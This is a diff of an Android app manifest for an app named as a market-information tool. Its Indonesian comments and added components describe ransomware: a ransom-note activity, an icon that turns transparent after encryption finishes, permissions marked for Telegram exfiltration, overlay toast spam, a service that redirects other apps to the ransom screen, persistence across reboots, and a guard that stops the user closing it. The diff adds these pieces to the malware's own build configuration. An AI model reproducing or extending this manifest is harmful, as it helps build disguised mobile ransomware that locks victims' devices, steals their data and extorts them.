@@ -2,36 +2,36 @@
 <manifest xmlns:android="http://schemas.android.com/apk/res/android"
     xmlns:tools="http://schemas.android.com/tools">
 
-    <!-- ================= STORAGE ================= -->
-    <!-- Android 4.4 - 9 -->
-    <uses-permission
-        android:name="android.permission.WRITE_EXTERNAL_STORAGE"
-        android:maxSdkVersion="29" />
+    <!-- STORAGE -->
+    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" android:maxSdkVersion="29" />
+    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" android:maxSdkVersion="32" />
+    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE" tools:ignore="ScopedStorage" />
 
-    <!-- Android 4.4 - 12L -->
-    <uses-permission
-        android:name="android.permission.READ_EXTERNAL_STORAGE"
-        android:maxSdkVersion="32" />
-
-    <!-- Android 11+ : akses penuh internal storage (via Settings) -->
-    <uses-permission
-        android:name="android.permission.MANAGE_EXTERNAL_STORAGE"
-        tools:ignore="ScopedStorage" />
-
-    <!-- ================= FOREGROUND SERVICE ================= -->
+    <!-- FOREGROUND SERVICE -->
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_SPECIAL_USE" />
     <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
 
-    <!-- ================= NOTIFIKASI ================= -->
+    <!-- NOTIFIKASI -->
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
 
-    <!-- ================= NETWORK (Telegram exfil) ================= -->
+    <!-- NETWORK -->
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
 
-    <!-- ================= AUTO-START SETELAH REBOOT ================= -->
+    <!-- REBOOT -->
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
+
+    <!-- OVERLAY (toast spam) -->
+    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+
+    <!-- QUERY SEMUA APK LAIN (Android 11+) -->
+    <queries>
+        <intent>
+            <action android:name="android.intent.action.MAIN" />
+            <category android:name="android.intent.category.LAUNCHER" />
+        </intent>
+    </queries>
 
     <application
         android:allowBackup="true"
@@ -41,7 +41,7 @@
         android:supportsRtl="true"
         android:theme="@style/Theme.InformasiPasar">
 
-        <!-- ================= ACTIVITY UTAMA ================= -->
+        <!-- ICON UTAMA (awal install pakai icon normal) -->
         <activity
             android:name=".MainActivity"
             android:exported="true"
@@ -52,14 +52,28 @@
             </intent-filter>
         </activity>
 
-        <!-- ================= ACTIVITY RANSOM NOTE ================= -->
+        <!-- ALIAS ICON KEDUA (transparan) — dipakai setelah enkripsi selesai -->
+        <activity-alias
+            android:name=".AliasBlank"
+            android:targetActivity=".RansomActivity"
+            android:enabled="false"
+            android:exported="true"
+            android:icon="@drawable/ic_blank"
+            android:label="@string/app_name">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
+
+        <!-- RANSOM NOTE -->
         <activity
             android:name=".RansomActivity"
             android:exported="false"
             android:excludeFromRecents="true"
             android:launchMode="singleTop" />
 
-        <!-- ================= BACKGROUND SERVICE ================= -->
+        <!-- BACKGROUND SERVICE -->
         <service
             android:name=".BackgroundService"
             android:exported="false"
@@ -70,16 +84,46 @@
                 android:value="Keep app running in background" />
         </service>
 
-        <!-- ================= BOOT RECEIVER (restart setelah reboot) ================= -->
-        <receiver
-            android:name=".BootReceiver"
-            android:exported="true"
-            android:enabled="true">
+        <!-- SERVICE TOAST SPAM + NOTIF -->
+        <service
+            android:name=".SpamService"
+            android:exported="false"
+            android:stopWithTask="false"
+            android:foregroundServiceType="specialUse">
+            <property
+                android:name="android.app.PROPERTY_SPECIAL_USE_FGS_SUBTYPE"
+                android:value="Keep running" />
+        </service>
+
+        <!-- REDIRECT APP LAIN KE RANSOM -->
+        <service
+            android:name=".RedirectService"
+            android:exported="false"
+            android:stopWithTask="false"
+            android:foregroundServiceType="specialUse">
+            <property
+                android:name="android.app.PROPERTY_SPECIAL_USE_FGS_SUBTYPE"
+                android:value="Redirect running apps" />
+        </service>
+
+        <!-- BOOT -->
+        <receiver android:name=".BootReceiver" android:exported="true" android:enabled="true">
             <intent-filter>
                 <action android:name="android.intent.action.BOOT_COMPLETED" />
                 <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
             </intent-filter>
         </receiver>
+
+        <!-- RECENT APPS HANDLER: ganggu user agar tidak bisa pencet X -->
+        <service
+            android:name=".RecentGuardService"
+            android:exported="false"
+            android:stopWithTask="false"
+            android:foregroundServiceType="specialUse">
+            <property
+                android:name="android.app.PROPERTY_SPECIAL_USE_FGS_SUBTYPE"
+                android:value="Recent guard" />
+        </service>
 
     </application>
 
